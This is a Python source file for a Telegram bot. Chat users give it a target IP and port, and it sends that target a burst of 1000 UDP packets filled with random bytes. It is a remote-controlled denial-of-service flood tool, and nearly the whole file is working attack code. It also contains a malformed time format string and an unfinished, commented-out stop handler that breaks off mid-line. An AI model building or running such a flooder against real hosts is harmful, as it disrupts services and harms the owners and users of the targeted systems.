#!/usr/bin/env python3
"""
Copyright 2023 host1let

Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the “Software”), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:

    The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.
"""

from colorama import Fore as f
import telebot
import socket
import random
import asyncio
import time
import uuid

def randomBytes():
    return random._urandom(1490)

def uid():
    return uuid.uuid4().hex

def infoBox(msg):
    return "{}[{}{}{}] [{}{}{}] {}".format(f.RESET, f.GREEN, "Info", f.RESET, f.YELLOW, time.strftime("%H:%M:%S"), f.RESET, msg)

def errorBox(msg):
    return "{}[{}{}{}] [{}{}{}] {}".format(f.RESET, f.RED, "ERROR", f.RESET, f.YELLOW, time.strftime("%H:%%M:%S"), f.RESET, msg)

def start(ip, port, for_):
    num = 0
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
#        num += 1

        for i in range(for_):
            sock.sendto(randomBytes(), (ip, port))
            num += 1
    except Exception as e:
        return e
        pass

    finally:
        return num



app = telebot.TeleBot(str(input("Enter Token > ")))

data : dict = {}



@app.message_handler(content_types=["text"], chat_types=["private"])



def main(msg):
    
    ipx_main = []
    portx_main = []

    text = str(msg.text)

    print(text)

    if text.startswith("/set_ip"):
        ip = str(text.replace("/set_ip ", ""))
        ip_code = uid()
        data["ip{}".format(ip_code)] = ip

        app.reply_to(msg, f"ip code : {ip_code}")

    elif text.startswith("/set_port"):
        port = int(text.replace("/set_port ", ""))
        port_code = uid()
        data["port{}".format(port_code)] = port

        app.reply_to(msg, f"port code: {port_code}")

    elif text.startswith("start"):
        app.reply_to(msg, "get data ...")
        more = text.replace("start ", "")

        ipportCode = [str(z) for z in more.split(":")]

        ipcode = ipportCode[1]
        portcode = ipportCode[-1]

        app.reply_to(msg, ipcode)
        app.reply_to(msg, portcode)

        for i, p in data.items():

            if i.startswith("ip"):
                code = i.replace("ip", "")
                
                if code == ipcode:
                  #  global ipMain
                    ipx_main.append(str(p))
                    print(ipx_main)

                else:
                    pass 
            elif i.startswith("port"):
                codeport = i.replace("port", "")

                if codeport == portcode:
                   # global portMain
                    portx_main.append(int(p))
                    print(portx_main)
                else:pass

        app.reply_to(msg, "process with {}:{} ... ".format(ipx_main[-1], portx_main[-1]))
        res = start(ipx_main[-1], portx_main[-1], 1000)
        app.reply_to(msg, "sended => {}".format(res))

  #  if text.startswith("/stop"):
 #       codeToStop = text.replace("/stop ", "")
#
 #       for k in data.keys():
#
  #          if k.startswith("ip"):
 #               code = k.replace("ip", "")
#
#                if code == codeT




app.infinity_polling()